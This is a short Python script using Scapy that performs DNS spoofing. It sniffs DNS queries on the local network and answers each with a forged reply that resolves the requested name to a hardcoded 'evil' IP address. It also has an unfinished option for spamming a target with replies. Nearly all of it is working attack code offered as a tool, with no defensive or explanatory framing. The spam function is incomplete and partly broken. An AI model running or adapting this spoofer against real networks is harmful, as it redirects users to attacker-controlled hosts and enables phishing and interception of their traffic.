#!/usr/bin/python
from scapy.all import *
import argparse
import thread

evil_ip = "9.9.9.9"

#sniff the traffic for at least a minute to try to capture DNS server
def sniff_dns(sniff_time):
	
	#filter used to grab DNS packets
	dns_filter = "dst port 53"
	
	#checking time to run the filter
	if sniff_time==None:
		sniff_time =300
	else:
		sniff_time = int(sniff_time)
	
	print "sniffing for DNS requests for " + str(sniff_time) + " seconds"
	sniff(prn=attack, count=3, timeout=sniff_time, filter=dns_filter)
	print "Limit Reached"

def attack(packet):
	
	print "Caught one sending one..."
	poison=IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(sport=53, dport=packet[UDP].sport) \
	/DNS(id=packet[DNS].id, qr=1, rd=1, ra=1, qdcount=1, ancount=1, qd=DNSQR(qname=packet[DNSQR].qname, qtype="A", qclass="IN"), \
	an=DNSRR(rrname=packet[DNSQR].qname, type="A", rclass="IN",ttl=3599, rdata=evil_ip ))
	
	send(poison, inter=0, loop=0, verbose=0)
	
#spam client with DNS replies
def spam_replies(evil_ip, target):
	print "About to spam " + target + " with IP: " + evil_ip

	#spam_response = IP(dst=target)\UDP(dport=53)

def main():
	#Args -e <IP of site to redirect user>, -d <DNS Server if known>
	# -t <target>, -n <noisy>
	
	parser = argparse.ArgumentParser(description='Some fun stuff with DNS')

	parser.add_argument("-e", "--evil", help="ip of website to redirect user")
	parser.add_argument("-d", "--DNS", help="DNS Server of target, if known")
	parser.add_argument("-n", "--noisy", help="Spam the target with responses")
	parser.add_argument("-s", "--secs", help="the amount of spent sniffing")
	parser.add_argument("-t", "--target", help="the target IP")
	args = parser.parse_args()
	
	
	sniff_dns(args.secs)
	#if args.noisy != None:
	#	spam_replies(args.evil, args.target)



if __name__=="__main__":
	main()
